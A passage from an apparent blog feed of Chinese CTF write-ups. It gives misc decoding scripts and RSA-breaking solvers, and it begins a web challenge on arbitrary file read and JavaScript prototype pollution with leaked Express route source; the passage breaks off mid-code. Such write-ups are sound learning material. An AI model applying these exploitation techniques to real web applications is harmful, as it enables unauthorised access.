115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97&#125;;  size_t size = 0x2E00;  for ( j = 0; j &lt; (int)size; ++j )    data[j] ^= key[j % 10];  v4 = fopen("daidai", "wb+");  fwrite(data, size, 1u, v4);  return 0;&#125;</code></pre><p>得到的文件是一个 Word 6.0 文件，打开后提示<br>My friend, I said, there is really no flag here, why don’t you believe me?</p><p>找到字符串 ，发现附近比较可疑</p><p>对全部内容进行xor，可找到完整flag</p><h3 id="鸣雏恋"><a href="#鸣雏恋" class="headerlink" title="鸣雏恋"></a>鸣雏恋</h3><p>binwalk提取doc文件，有一个压缩包，找到key里面有线索，是零宽字节，解出密码。</p><p>压缩包还有一个压缩包，用密码解压得十二万个图片，可以猜想为二进制即01或者黑白，用脚本转换为了二进制得flag。</p><pre class="language-python" data-language="python"><code class="language-python">white <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'C:\Users\Administrator\Desktop\鸣雏恋_2dad763070b79f50c4635a906359909a\鸣雏恋\_rels\love\out\0.png'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>black <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'C:\Users\Administrator\Desktop\鸣雏恋_2dad763070b79f50c4635a906359909a\鸣雏恋\_rels\love\out\1.png'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#注意要填文件真实的地址</span>flag <span class="token operator">=</span> <span class="token string">''</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">129488</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    color <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'C:\Users\Administrator\Desktop\鸣雏恋_2dad763070b79f50c4635a906359909a\鸣雏恋\_rels\love\out\%d.png'</span><span class="token operator">%</span>i<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>color <span class="token operator">==</span> white<span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token string">'0'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token string">'1'</span><span class="token comment">#把二进制数转为字符串</span>ans <span class="token operator">=</span> <span class="token string">''</span>length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">8</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>    ans <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span></code></pre><p>输出得二进制字符串</p><p>转字符串</p><p>根据提示，base64转hex，另存为png</p><p>得到flag</p><h3 id="ChieftainsSecret"><a href="#ChieftainsSecret" class="headerlink" title="ChieftainsSecret"></a>ChieftainsSecret</h3><p>binwalk 出一个压缩包</p><p>得到一张图片和一个csv TLE5501角度传感器，可以看到接口的对应关系通过 pc1-pc2 pc3-pc4  算出具体角度最后通过角度偏移得到打电话的数字</p><p>77085962457</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="myRSA"><a href="#myRSA" class="headerlink" title="myRSA"></a>myRSA</h3><p>等了一年终于连上了远程，直接拿flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">109291726712521562723217799066595465738514008562793813124735859077003607567378308344900227726005943523435691922275823930699185558905584992475684350943587216218159563567105178716429607251904576481331913955542279314418005710062312937628773101937560276030946008602896333498620895794065652328753887107382421236463</span><span class="token comment"># 发送b'\x01'的数据</span>m1 <span class="token operator">=</span> <span class="token number">9525397945159597083139236796554389057349388348561320860497256507608704178409073111423041648854415731502829246163813817887013295691211115103559158067048812940460342194773168560663306267552081548022969259450140126995928980812391022443278295051940120607312916391873625551459919069565401135463687861822761080960205441980160935262098587017605666572800848834634719283023350989003155672616785656418280486284252404327230995895334350449329496820373234495050858491300214136</span>flag <span class="token operator">=</span> <span class="token number">84714851061101551104842512208187516497690941059475723791750410942286241438698723551108297972855709502813510704312734246065654513821412192005193874395178433209848447807820345594430525933303605443157096791247595647420106894826618667916444279408290598367546651937728210043377385005880582654352783857030860269528710293017844982383988131043975713555798776601699577367436001411779466011751454954293920819863328114688953193568821221654373376635664655139419988801273771425680451278262871578890722408740436473781164730132065673797985283333324587469932990362283302547046173192527601753522974618089085155465973571933897481911626440582347862648387324192155488169555320343590638542052353093371100231443955010712018714258942911513526907631585015690345636535765895659959658571378505136</span>t <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>m1<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token comment"># print(t)</span><span class="token keyword">while</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>t<span class="token operator">*</span>t<span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span>n<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>    t <span class="token operator">=</span> t<span class="token operator">-</span><span class="token number">1</span>t2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>t<span class="token operator">*</span>t<span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span>n<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token punctuation">(</span>t<span class="token operator">+</span>t2<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>q <span class="token operator">=</span> n<span class="token operator">//</span>px <span class="token operator">=</span> p<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">3</span><span class="token operator">*</span>q <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token operator">+</span> q<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">+</span> <span class="token number">3</span><span class="token operator">*</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> y <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">*</span>q <span class="token operator">+</span> p <span class="token operator">+</span> qc <span class="token operator">=</span> <span class="token punctuation">(</span>flag<span class="token operator">//</span><span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span><span class="token number">65537</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><img src="/article/2021xyb/1629541706(1).png" class="" title="1629541706(1)" loading="lazy"><h3 id="Random-RSA"><a href="#Random-RSA" class="headerlink" title="Random_RSA"></a>Random_RSA</h3><p>懒得开虚拟机，python2没有密码库，所以上面是用python2跑出来的dp，下面解密用的python3。</p><p>ps:这个题好像必须得用python2跑dp，py3的MT算法似乎参数有点不同，跑出来的数据也不同。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># import random</span><span class="token comment"># import binascii</span><span class="token comment"># import os</span><span class="token comment"># tmp = [[58, 53, 122], [145, 124, 244], [5, 19, 192], [255, 23, 64], [57, 113, 194], [246, 205, 162], [112, 87, 95], [215, 147, 105], [16, 131, 38], [234, 36, 46], [68, 61, 146], [148, 61, 9], [139, 77, 32], [96, 56, 160], [121, 76, 17], [114, 246, 92], [178, 206, 60], [168, 147, 26], [168, 41, 68], [24, 93, 84], [175, 43, 88], [147, 97, 153], [42, 94, 45], [150, 103, 127], [68, 163, 62], [165, 37, 89], [219, 248, 59], [241, 182, 8], [140, 211, 146], [88, 226, 2], [48, 150, 56], [87, 109, 255], [227, 216, 65], [23, 190, 10], [5, 25, 64], [6, 12, 124], [53, 113, 124], [255, 192, 158], [61, 239, 5], [62, 108, 86], [123, 44, 64], [195, 192, 30], [30, 82, 95], [56, 178, 165], [68, 77, 239], [106, 247, 226], [17, 46, 114], [91, 71, 156], [157, 43, 182], [146, 6, 42], [148, 143, 161], [108, 33, 139], [139, 169, 157], [71, 140, 25], [28, 153, 26], [241, 221, 235], [28, 131, 141], [159, 111, 184], [47, 206, 11], [220, 152, 157], [41, 213, 97], [4, 220, 10], [77, 13, 248], [94, 140, 110], [25, 250, 226], [218, 102, 109], [189, 238, 66], [91, 18, 131], [23, 239, 190], [159, 33, 72], [183, 78, 208], [209, 213, 101], [111, 50, 220], [166, 104, 233], [170, 144, 10], [187, 87, 175], [195, 59, 104], [165, 179, 179], [99, 247, 153], [195, 61, 100], [223, 159, 165], [230, 93, 184], [87, 28, 35], [35, 122, 38], [158, 188, 163], [229, 192, 222], [12, 12, 192], [207, 95, 224], [127, 113, 137], [22, 114, 143], [13, 45, 144], [70, 140, 211], [57, 101, 42], [132, 62, 129], [40, 128, 124], [1, 132, 161], [164, 33, 133], [252, 201, 32], [8, 18, 247], [1, 88, 55], [201, 135, 186], [101, 254, 125], [236, 196, 39], [148, 24, 103], [101, 29, 253], [97, 156, 64], [90, 103, 91], [50, 48, 80], [206, 22, 93], [11, 114, 174], [61, 132, 247], [215, 32, 232], [95, 128, 90], [57, 35, 228], [163, 143, 107], [178, 250, 28], [64, 107, 225], [106, 115, 207], [85, 134, 21], [118, 201, 76], [234, 34, 22], [241, 236, 122], [111, 185, 127], [1, 26, 164], [254, 57, 117], [243, 27, 32], [161, 88, 80], [50, 165, 93], [87, 182, 216], [184, 159, 63], [167, 166, 123], [37, 78, 33], [186, 81, 58], [48, 3, 239], [70, 186, 13], [56, 108, 178], [54, 55, 235], [105, 180, 105], [16, 194, 98], [136, 11, 41], [18, 203, 79], [185, 114, 170], [148, 181, 223], [118, 57, 160], [23, 250, 181], [235, 219, 228], [44, 151, 38], [185, 224, 134], [42, 162, 122], [3, 9, 158], [129, 245, 2], [66, 241, 92], [80, 124, 36]]</span><span class="token comment"># res = [55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81]</span><span class="token comment"># seeds = [4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579]</span><span class="token comment"># dp = bytearray()</span><span class="token comment"># for i in range(0, len(seeds)):</span><span class="token comment">#     random.seed(seeds[i])</span><span class="token comment">#     rands = []</span><span class="token comment">#     for j in range(0,4):</span><span class="token comment">#         rands.append(random.randint(0,255))</span><span class="token comment">#     print(str(rands))</span><span class="token comment">#     dp.append(res[i] ^ rands[i%4])</span><span class="token comment"># print(dp)</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2dp <span class="token operator">=</span> <span class="token number">5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> dp<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    _ <span class="token operator">=</span> dp <span class="token operator">*</span> e <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> _ <span class="token operator">%</span> i<span class="token punctuation">:</span>            p <span class="token operator">=</span> _ <span class="token operator">//</span> i <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> n <span class="token operator">%</span> p<span class="token punctuation">:</span>                q <span class="token operator">=</span> n <span class="token operator">//</span> p                phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>                d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> dn<span class="token operator">=</span><span class="token number">81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391</span>ct<span class="token operator">=</span><span class="token number">61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151</span>e <span class="token operator">=</span> <span class="token number">0x10001</span>d <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>e<span class="token punctuation">,</span> dp<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>ct<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><img src="/article/2021xyb/1.png" class="" width="1" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021巅峰极客一道题——ezjs</title>
      <link href="article/2021dfjk/"/>
      <url>article/2021dfjk/</url>
      
        <content type="html"><![CDATA[<p>深入学习一下JavaScript的原型链污染漏洞</p><span id="more"></span><p>我是巅峰fw，就摸出来一道题目，好好学习下原型链污染。以下为做题视角。</p><h2 id="Web-ezjs"><a href="#Web-ezjs" class="headerlink" title="Web-ezjs"></a>Web-ezjs</h2><h3 id="第一步-任意文件读取"><a href="#第一步-任意文件读取" class="headerlink" title="第一步 - 任意文件读取"></a>第一步 - 任意文件读取</h3><p>打开题目发现非常简洁的登陆，以为是sql注入，随便输入以下发现直接进入了。</p><p>登陆限制username和password大于5位</p><img src="/article/2021dfjk/image-20210803151950579.png" class="" title="image-20210803151950579" loading="lazy"><p>图片显示这块明显有异常，对应GET请求的newing参数</p><img src="/article/2021dfjk/image-20210803142727224.png" class="" title="image-20210803142727224" loading="lazy"><h4 id="存在任意文件读取"><a href="#存在任意文件读取" class="headerlink" title="存在任意文件读取"></a>存在任意文件读取</h4><img src="/article/2021dfjk/image-20210803142841282.png" class="" title="image-20210803142841282" loading="lazy"><p>利用此处读取了部分源码如下</p><p><code>/app/routes/index.js</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> <span class="token punctuation">&#123;</span>body<span class="token punctuation">,</span> validationResult<span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-validator'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> validator <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">min</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"username is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">min</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"password is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> errors <span class="token operator">=</span> <span class="token function">validationResult</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>errors<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> errors<span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>msg<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>validator<span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">"登录界面"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">;</span>  <span class="token keyword">let</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> password <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'admin password error'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/verify'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'plz input your username and password'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/verify'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'login first plz'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">=</span> <span class="token string">"notadmin"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'verify'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'success'</span><span class="token punctuation">,</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'verify success'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 